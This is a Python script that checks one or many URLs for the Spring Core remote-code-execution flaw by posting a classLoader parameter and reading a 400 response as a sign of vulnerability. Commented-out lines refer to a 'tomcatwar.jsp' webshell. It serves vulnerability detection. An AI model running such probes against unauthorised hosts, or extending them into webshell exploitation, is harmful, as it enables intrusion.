#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.URLs%5B0%5D=0"
    try:

        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        #shellurl = urljoin(url, 'tomcatwar.jsp')
        #shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if go.status_code == 400:
            print(f"漏洞可能存在，存在的地址为{url},建议采用上传脚本进行进一步校验")
    except Exception as e:
        print(e)
        pass




def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()
